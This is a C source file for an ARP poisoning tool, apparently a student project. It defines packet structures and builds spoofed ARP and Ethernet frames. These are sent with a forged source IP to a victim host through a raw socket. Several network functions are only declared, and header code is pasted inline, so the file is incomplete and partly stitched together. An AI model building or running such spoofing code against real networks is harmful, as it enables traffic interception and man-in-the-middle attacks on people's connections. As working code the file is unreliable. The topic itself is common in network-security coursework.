/*
** main.c for main in /home/janel/arp_poisoning
**
** Made by Janel
** Login   <janel@epitech.net>
**
** Started on  Thu Feb 23 14:49:38 2017 Janel
** Last update Fri Mar 23 02:06:34 2018 
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include "arp_poisoning.h"
#include "network.h"


#ifndef ARP_POISONING_H_
# define ARP_POISONING_H_

# define FALSE				0
# define TRUE				!FALSE
# define SPOOFED_PACKET_SEND_DELAY	1

/*
** src/utils/misc.c
*/
void		usage(const char[const]);
uint8_t         *get_hardware_address(const char * const);

#endif /* !ARP_POISONING_H_ */


#ifndef DEBUG_H_
# define DEBUG_H_

# define color_red "\033[1;31m"
# define color_none "\033[0;m"
# define PRINT_MAC_ADDRESS(X)   fprintf(stdout, "|MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n", \
					X[0],				\
					X[1],				\
					X[2],				\
					X[3],				\
					X[4],				\
					X[5]);
# define PRINT_IP_ADDRESS(X)    fprintf(stdout, "|IP address: %02d.%02d.%02d.%02d\n", \
					X[0],				\
					X[1],				\
					X[2],				\
					X[3]);

#endif /* !DEBUG_H_ */


#ifndef ERROR_MESSAGES_H_
# define ERROR_MESSAGES_H_

# define NEWLINE			"\n"
# define ADD_NEWLINE(STRING)		STRING NEWLINE
# define ERROR_SOCKET_CREATION		ADD_NEWLINE("[-] ERROR: Socket creation failed")
# define ERROR_GET_MAC			ADD_NEWLINE("[-] ERROR: Could not get MAC address")
# define ERROR_PACKET_CREATION_ARP	ADD_NEWLINE("[-] ERROR: ARP packet creation failed")
# define ERROR_PACKET_CREATION_ETHER	ADD_NEWLINE("[-] ERROR: Ether frame creation failed")
# define ERROR_COULD_NOT_SEND		ADD_NEWLINE("[-] ERROR: Could not send")
# define ERROR_COULD_NOT_RECEIVE	ADD_NEWLINE("[-] ERROR: Could not receive")
# define ERROR_DISPLAY_USAGE		ADD_NEWLINE("[*] USAGE: %s source_ip target_ip interface")

#endif /* !ERROR_MESSAGES_H_ */

#ifndef NETWORK_H_
# define NETWORK_H_

# define HARDWARE_LENGTH	6
# define IP_LENGTH		4
# define BROADCAST_ADDR		(uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}

/*
** src/network/interface.c
*/
uint8_t				*get_my_mac_address(const int sd, const char interface[const]);
char				get_index_from_interface(struct sockaddr_ll *device, const char interface[const]);

/*
** src/network/network.c
*/
char				send_packet_to_broadcast(const int sd, struct sockaddr_ll *device,
							 const uint8_t *my_mac_address, const char *spoofed_ip_source, const char *victim_ip);
uint8_t				*get_victim_response(const int sd, const char *victim_ip);
char				send_payload_to_victim(const int sd, struct sockaddr_ll *device,
						       const uint8_t *my_mac_address, const char *spoofed_ip_source,
						       const uint8_t *victim_mac_address, const char *victim_ip);

#endif /* !NETWORK_H_ */


#ifndef PACKETS_H_
# define PACKETS_H_
# define ETH_HEADER_LENGTH 14
# define ARP_HEADER_LENGTH 28

typedef struct	s_ethernet_packet
{
  uint8_t	destination_mac_address[HARDWARE_LENGTH];
  uint8_t	source_mac_address[HARDWARE_LENGTH];
  uint16_t	ether_type;
}		t_ethernet_packet;

typedef struct	s_arp_packet
{
  uint16_t	hardware_type;
  uint16_t	protocol_type;
  uint8_t	hardware_len;
  uint8_t	protocol_len;
  uint16_t	opcode;
  uint8_t	sender_mac[HARDWARE_LENGTH];
  uint8_t	sender_ip[IP_LENGTH];
  uint8_t	target_mac[HARDWARE_LENGTH];
  uint8_t	target_ip[IP_LENGTH];
}		t_arp_packet;

/*
** src/network/packets.c
*/
t_arp_packet	*create_arp_packet(const uint16_t opcode,
				   const uint8_t *my_mac_address, const char *spoofed_ip_source,
				   const uint8_t *destination_mac_address, const char *destination_ip);
t_ethernet_packet	*create_ethernet_packet(const uint8_t *src_mac, const uint8_t *dest_mac, const t_arp_packet *arp_packet);

#endif /* !PACKETS_H_ */





void		usage(const char prog_name[const])
{
  fprintf(stderr, ERROR_DISPLAY_USAGE, prog_name);
}

uint8_t         *get_hardware_address(const char * const hardware_addr)
{
  uint8_t       *mac;

  if (!(mac = malloc(sizeof(uint8_t) * HARDWARE_LENGTH)))
    return (NULL);
  memcpy(mac, hardware_addr, sizeof(uint8_t) * HARDWARE_LENGTH);
  return (mac);
}

t_arp_packet	*create_arp_packet(const uint16_t opcode,
				   const uint8_t *my_mac_address, const char *spoofed_ip_source,
				   const uint8_t *destination_mac_address, const char *destination_ip)
{
  t_arp_packet	*arp_packet;

  if (!(arp_packet = malloc(sizeof(t_arp_packet))))
    return (NULL);
  arp_packet->hardware_type = htons(1);
  arp_packet->protocol_type = htons(ETH_P_IP);
  arp_packet->hardware_len = HARDWARE_LENGTH;
  arp_packet->protocol_len = IP_LENGTH;
  arp_packet->opcode = htons(opcode);
  memcpy(&arp_packet->sender_mac, my_mac_address, sizeof(uint8_t) * HARDWARE_LENGTH);
  memcpy(&arp_packet->target_mac, destination_mac_address, sizeof(uint8_t) * HARDWARE_LENGTH);
  if (inet_pton(AF_INET, spoofed_ip_source, arp_packet->sender_ip) != 1
      || inet_pton(AF_INET, destination_ip, arp_packet->target_ip) != 1)
    return (NULL);
  return (arp_packet);
}

t_ethernet_packet	*create_ethernet_packet(const uint8_t *src_mac,
						const uint8_t *dest_mac,
						const t_arp_packet *arp_packet)
{
  t_ethernet_packet	*ethernet_packet;

  if (!(ethernet_packet = malloc(sizeof(uint8_t) * IP_MAXPACKET)))
    return (NULL);
  memcpy(&ethernet_packet->destination_mac_address, dest_mac, sizeof(uint8_t) * HARDWARE_LENGTH);
  memcpy(&ethernet_packet->source_mac_address, src_mac, sizeof(uint8_t) * HARDWARE_LENGTH);
  memcpy(&ethernet_packet->ether_type, (uint8_t[2]){ETH_P_ARP / 256, ETH_P_ARP % 256}, sizeof(uint8_t) * 2);
  memcpy((uint8_t *)ethernet_packet + ETH_HEADER_LENGTH, arp_packet, sizeof(uint8_t) * ARP_HEADER_LENGTH);
  return (ethernet_packet);
}




int			main(int argc, char *argv[])
{
  char			*victim_ip, *spoofed_ip_source, *interface;
  uint8_t		*my_mac_address, *victim_mac_address;
  struct sockaddr_ll	device;
  int			sd;

  if (argc != 4)
    return (usage(argv[0]), EXIT_FAILURE);
  spoofed_ip_source = argv[1]; victim_ip = argv[2]; interface = argv[3];
  if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    return (fprintf(stderr, ERROR_SOCKET_CREATION), EXIT_FAILURE);
  if (!(my_mac_address = get_my_mac_address(sd, interface)))
    return (fprintf(stderr, ERROR_GET_MAC), EXIT_FAILURE);
  memset(&device, 0, sizeof device);
  return (!(get_index_from_interface(&device, interface)
	    && send_packet_to_broadcast(sd, &device, my_mac_address, spoofed_ip_source, victim_ip)
	    && (victim_mac_address = get_victim_response(sd, victim_ip))
	    && send_payload_to_victim(sd, &device,
				      my_mac_address, spoofed_ip_source,
				      victim_mac_address, victim_ip))
	  ? (EXIT_FAILURE)
	  : (EXIT_SUCCESS));
}
